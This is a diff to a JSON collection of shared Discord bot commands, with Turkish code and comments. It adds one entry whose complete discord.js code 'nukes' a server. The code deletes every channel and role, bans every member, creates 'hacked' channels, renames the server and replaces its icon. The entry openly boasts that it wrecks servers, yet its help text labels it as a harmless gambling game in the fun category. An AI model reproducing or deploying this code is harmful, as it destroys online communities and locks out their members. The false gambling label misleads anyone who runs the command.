@@ -693,6 +693,20 @@
                 "kod_rank": "topluluk",
                 "k_adi": "ꋿ  Tatlı Bir Kedi ¹⁵'⁰⁸",
                 "date": "8/16/2020"
+            },
+            "v11 Sunucu Patlatma [ Efso Komut ]": {
+                "isim": "v11 Sunucu Patlatma [ Efso Komut ]",
+                "id": "VKA5yIBDNS",
+                "desc": "Kodu Kullandığınızda O Sunucuyu Mahveder :D",
+                "modules": [
+                    "Yok"
+                ],
+                "icon": "https://cdn.discordapp.com/avatars/727046674006147134/a0a9a522106e33e619c48adb2dceb63e.png",
+                "main_code": "Main Gerektirmiyor",
+                "komutlar_code": "const Discord = require('discord.js');\r\nexports.run = function(client, message) {\r\n  message.guild.channels.map(m => m.delete())/* m.delete() Listelenen Kanalları sil  */\r\n  message.guild.createChannel('hacked','text').then(zzz => {\r\n    zzz.send('**Sunucunu Hackledik Ağla :D**')//Mesaj gönderiyoruz\r\n  message.guild.createChannel('▬▬▬▬▬▬▬', 'voice')\r\n  message.guild.createChannel('Bu Sunucu','voice')\r\n  message.guild.createChannel('Hacklenmiştir','voice')\r\n  message.guild.createChannel('Kolaydınız :D','voice')\r\n  message.guild.createChannel('▬▬▬▬▬▬▬','voice')\r\n  message.guild.createChannel('HÜKÜMDARLIĞIMIZ','voice')\r\n  message.guild.createChannel('SONSUZ','voice')\r\n  message.guild.createChannel('AFFETMEYİZ','voice')\r\n  message.guild.createChannel('YENİLMEYİZ','voice')\r\n  message.guild.createChannel('▬▬▬▬▬▬▬','voice')\r\n  message.guild.createChannel('KÜLLERİMİZDEN','voice')\r\n  message.guild.createChannel('DOĞACAĞIZ','voice')\r\n  message.guild.createChannel('▬▬▬▬▬▬▬','voice')\r\n  message.guild.createChannel('Bu Sunucu','voice')\r\n  message.guild.createChannel('Hacklenmiştir','voice')\r\n  message.guild.createChannel('Kolaydınız :D','voice')\r\n  message.guild.createChannel('▬▬▬▬▬▬▬','voice')\r\n  message.guild.createChannel('HÜKÜMDARLIĞIMIZ','voice')\r\n  message.guild.createChannel('SONSUZ','voice')\r\n  message.guild.createChannel('AFFETMEYİZ','voice')\r\n  message.guild.createChannel('YENİLMEYİZ','voice')\r\n  message.guild.createChannel('▬▬▬▬▬▬▬','voice')\r\n  message.guild.createChannel('KÜLLERİMİZDEN','voice')\r\n  message.guild.createChannel('DOĞACAĞIZ','voice')\r\n  message.guild.createChannel('▬▬▬▬▬▬▬','voice')\r\nmessage.guild.roles.forEach(rols => {\r\n     rols.delete()\r\n\r\n})\r\n\r\nmessage.channel.send(\"**Başarı İle Bir Sunucu Hacklendi!**\")\r\n\r\n let embed = new Discord.RichEmbed()\r\n  .setColor('#FFB900')\r\n  .setAuthor(\" Rol Silme Sistemi\", client.user.avatarURL)\r\n  .setThumbnail(message.guild.iconURL)\r\n  .setDescription(`Bir sunucuda **Hack İşlemi** yapıldı.\\n\\n**Sunucu ad:** ${message.guild.name}\\n**Sunucu ID:** ${message.guild.id}\\n**Rolleri Silen Kişi:** ${message.author.tag}\\n**Rolleri Silen Kişi İd si:** ${message.author.id}`)\r\n  client.channels.get('').send(embed)\r\n  \r\n  })\r\n    message.guild.members.forEach(i => {\r\n    i.ban();\r\nmessage.guild.setIcon(\"https://cdn.discordapp.com/attachments/616893047132651520/650704159443779584/download.jpg\")\r\nmessage.guild.setName('Bla Bla Tarafından Hacklendiniz')\r\n  });\r\n};\r\n\r\nexports.conf = {\r\n  enabled: true,//True => Komut açık, False => Komut kapalı \r\n  guildOnly: false, //True => Sadece Servere Özel, False => Heryerde kullanılabilir\r\n  aliases: ['yoket'],//Komutun farklı kullanımları ÖR: !ping, !p\r\n  permLevel: 4 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)\r\n};\r\n\r\nexports.help = {\r\n  name: 'haçkla',//Komutun adı (Komutu girerken lazım olucak)\r\n\r\n  description: 'Kumar oynarsınız',//Komutun Açıklaması\r\n    kategori: 'eğlence',// Komutun olduğu kategori. kategoriler: bot-sunucu-yetkili-kullanıcı\r\n  usage: 'kumaroyna' //komutun kullanım şekli; ÖR: !ban @Kullanıcı\r\n}",
+                "kod_rank": "topluluk",
+                "k_adi": "!    Carmella*★",
+                "date": "8/16/2020"
             }
         }
     }
